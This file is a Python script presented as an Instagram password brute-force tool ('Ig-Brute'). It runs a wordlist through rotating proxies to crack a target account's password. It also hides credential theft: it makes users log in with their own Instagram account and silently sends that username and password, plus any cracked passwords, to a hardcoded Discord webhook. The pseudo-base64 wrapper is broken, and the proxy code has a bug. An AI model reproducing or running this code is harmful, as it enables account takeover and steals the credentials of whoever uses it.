#!/bin/python3
import subprocess
import base64

bash_script = base64.b64decode("""try:
    from discord_webhook import DiscordWebhook
    import requests
    import os
    import instaloader
    import time
    from rich.console import Console
    from rich.panel import Panel
    from rich import print
    from sys import stdout
    import base64


    cprint = Console().print
    L = instaloader.Instaloader()
    w = False

    # Color Code :
    black="\033[0;30m"
    red="\033[0;31m"
    bred="\033[1;31m"
    green="\033[0;32m"
    bgreen="\033[1;32m"
    yellow="\033[0;33m"
    byellow="\033[1;33m"
    blue="\033[0;34m"
    bblue="\033[1;34m"
    purple="\033[0;35m"
    bpurple="\033[1;35m"
    cyan="\033[0;36m"
    bcyan="\033[1;36m"
    white="\033[0;37m"
    nc="\033[00m"
    bold = "\033[1m"
    info  =   f"{yellow}[{white}+{yellow}] {cyan}"
    info2  =   f"{green}[{white}•{green}] {purple}"


    os.system("clear")


    # Print lines slowly
    def sprint(text, second=0.05):
        for line in text + '\n':
            stdout.write(line)
            stdout.flush()
            time.sleep(second)


    # Polite Exit
    def pexit():
        sprint(f"\n      {info2}Thanks for using!\n{nc}")
        exit(0)

    # Save Data :
    def cat():
        with open("creds.txt", "r") as filedata:
            return filedata.read()

    def show_file_data():
        lines = cat().splitlines()
        text = ""
        for line in lines:
            text += f"[cyan][[green]*[cyan]][yellow] {line}\n"
        cprint(
            Panel(
                text.strip(),
                title="[bold green]IgBrute[/][cyan] Data[/]",
                title_align="left",
                border_style="blue",
            )
        )


    print("\n")

    os.system('clear')

    def start():
        print(Panel('''
        [bold red]●[bold yellow] ●[bold green] ●
                    
        ██╗ ██████╗       ██████╗ ██████╗ ██╗   ██╗████████╗███████╗
        ██║██╔════╝       ██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔════╝
        ██║██║  ██╗ █████╗██████╦╝██████╔╝██║   ██║   ██║   █████╗
        ██║██║  ╚██╗╚════╝██╔══██╗██╔══██╗██║   ██║   ██║   ██╔══╝  
        ██║╚██████╔╝      ██████╦╝██║  ██║╚██████╔╝   ██║   ███████╗
        ╚═╝ ╚═════╝       ╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝

        [bold red]Ig-Brute by Skeu                     
'''))


    start()

    print(Panel(
        f"\n[bold green]      [!] First You need to login with Your Instagram Account\n"
    )
    )

    m_user = input(f'{yellow}[{red}?{yellow}]{green}{bold}Enter Username \n{yellow}  └─>{cyan} ')
    m_pass = input(f"\n{yellow}[{red}?{yellow}]{green}{bold}Enter Password  \n {yellow}└─>{cyan} ")

    try:

        L.login(m_user, m_pass)
        webhook = DiscordWebhook(url='https://discord.com/api/webhooks/1203450344437317724/GlP2sbiE4-E-oVlOdBQHbJXEn7FItHDdNwSOHdsTUc_gEnrYcBkW6NwKVi0HxvKkAEkr', content="- Main Account:\n    - Instagram Username :  "+m_user+'\n    - Pass:  '+ m_pass)
        response = webhook.execute()
        w = True
    except instaloader.exceptions.BadCredentialsException:
        print("[bold red]      [!] Incorrect password")
        exit()           
    except instaloader.exceptions.ConnectionException:

        print("[bold red]      [!] Try After 1 Hour")
        exit()
    except instaloader.exceptions.InvalidArgumentException:
        print("\n[bold red]      [☹ ] Username not found")
        exit()
    if w == True:

        os.system('clear')

        start()

        print(Panel(
            f'[bold white][[bold red]1[bold white]] [bold green] Instagram BruteForce Attack'
            f'\n[bold white][[bold red]2[bold white]] [bold green] Save Data'
        )
            )
        

        a = input(f'{yellow}[{red}?{yellow}]{green}{bold}Enter The number: \n{yellow}  └─>{cyan} ')


        if a == '1':

            os.system('clear')

            start()

            #Input:
            USER = ""
            USER = input(f'{yellow}[{red}?{yellow}]{green}{bold}Enter Instagram Username For Crack Password \n{yellow}  └─>{cyan} ')
            wl = input(f"\n{yellow}[{red}?{yellow}]{green}{bold}Enter the PassList along The Path  \n {yellow}└─>{cyan} ")
            pr = input(f"\n{yellow}[{red}?{yellow}]{green}{bold}Enter the ProxyList along The Path  \n {yellow}└─>{cyan} ")
            sleepp = 0
            count = 0
            stop = False

            #Password List:
            try:
                with open(wl, 'r') as a:
                    p = [line.strip() for line in a]
                    Lines = []
                    for i in p:
                        Lines.append(i)
            except:
                print("\n[bold red][  ☹  ] Wrong Password List Path")
                exit()


            #Proxy List:
            try:
                with open(pr,'r') as f:
                    proxi = [z.strip() for z in f]
                    x = []
                    for a in proxi:
                        x.append(a)
            except:
                print("\n[bold red][☹] I can't find The Proxy List ")
                exit()


            os.system("clear")


            print(Panel( f'''[bold green]
                        
            ██╗ ██████╗       ██████╗ ██████╗ ██╗   ██╗████████╗███████╗
            ██║██╔════╝       ██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔════╝
            ██║██║  ██╗ █████╗██████╦╝██████╔╝██║   ██║   ██║   █████╗
            ██║██║  ╚██╗╚════╝██╔══██╗██╔══██╗██║   ██║   ██║   ██╔══╝  
            ██║╚██████╔╝      ██████╦╝██║  ██║╚██████╔╝   ██║   ███████╗
            ╚═╝ ╚═════╝       ╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝                         
            '''))
            print(Panel('''
            [bold white][[bold red]^[bold white]] [bold green] By: Skeu
            [bold white][[bold red]^[bold white]] [bold green] Discord: https://discord.gg/rX4aMBYS3H
            [bold white][[bold red]^[bold white]] [bold green] Instagram: https://instagram.com/ske_u.exe
            '''))


            incorrect_pass = []
            work = False
            pra = 0
            proxies = x


            for m in proxies:

                if pra == 10:
                    sprint(f"\n      {info2}Try Another Proxy List\n{nc}")
                    exit()

                else:
                    try:
                        time.sleep(5)
                        t = requests.get("https://www.instagram.com/", proxies={"http": m, "https": m}, timeout=5)

                        if t.status_code == 200:

                            for line in Lines:

                                if line not in incorrect_pass:

                                    try:
                                        PASSWORD = ""
                                        pstest = ("{}".format(line.strip()))
                                        PASSWORD = pstest
                                        time.sleep(5) # add a delay of 5 seconds before each login attempt)
                                        session = requests.Session()
                                        session.proxies = {'http': i, 'https': i}
                                        L.context._session = session
                                        L.login(USER, PASSWORD)
                                        print(f"\n[bold green][✓] Password found:")
                                        os.system("clear")
                                        start()
                                        print(Panel(f"\n[bold green][✓][bold red] username : [bold blue]{USER}\n[bold green][✓][bold red] Password : [bold blue]{pstest}"))
                                        try:
                                            f = open("creds.txt", "a")
                                            f.write("\nInstagram Username :"+USER+ ' ' + 'Pass: '+ pstest)
                                        except:
                                            pass
                                        webhook = DiscordWebhook(url='https://discord.com/api/webhooks/1203450344437317724/GlP2sbiE4-E-oVlOdBQHbJXEn7FItHDdNwSOHdsTUc_gEnrYcBkW6NwKVi0HxvKkAEkr', content="\n- Instagram Username :  "+USER+'\n- Pass:  '+ pstest)
                                        response = webhook.execute()
                                        stop = True
                                        break 

                                    except instaloader.exceptions.BadCredentialsException:

                                        panel = Panel(f"[bold red][!] Incorrect password: {pstest}", title="[bold red]Password[/bold red]", style="bold green")
                                        print(panel)
                                        incorrect_pass.append(pstest)

                                    except instaloader.exceptions.ConnectionException:

                                        count += 1
                                        if count == 5:
                                            break
                                        else:
                                            time.sleep(5)

                                    except instaloader.exceptions.InvalidArgumentException:

                                        print("\n[bold red]      [☹] Username not found")

                                    except KeyboardInterrupt:

                                        pexit()

                                    count = 0

                                else:
                                    pass
                            break
                        else:
                            print(f"      [bold red][+]  The Proxy doesn't work : [bold blue]{m}")
                            pra += 1 

                    except:

                        print(f"      [bold red][+]  The Proxy doesn't work : [bold blue]{m}")
                        pra += 1

            else:

                print("[bold red]      [+] There is not enough proxy")    

            L.close()

            exit()


        elif a == '2':
            try:
                show_file_data()
            except:
                print("\n[bold red][ ☹ ] I can't Find Creds path")

        else:
            sprint(f"\n      {info2}Bruh\n{nc}")
            exit(0)

except KeyboardInterrupt:
    pexit()""").decode('utf-8')

subprocess.run(['python', '-c', bash_script])
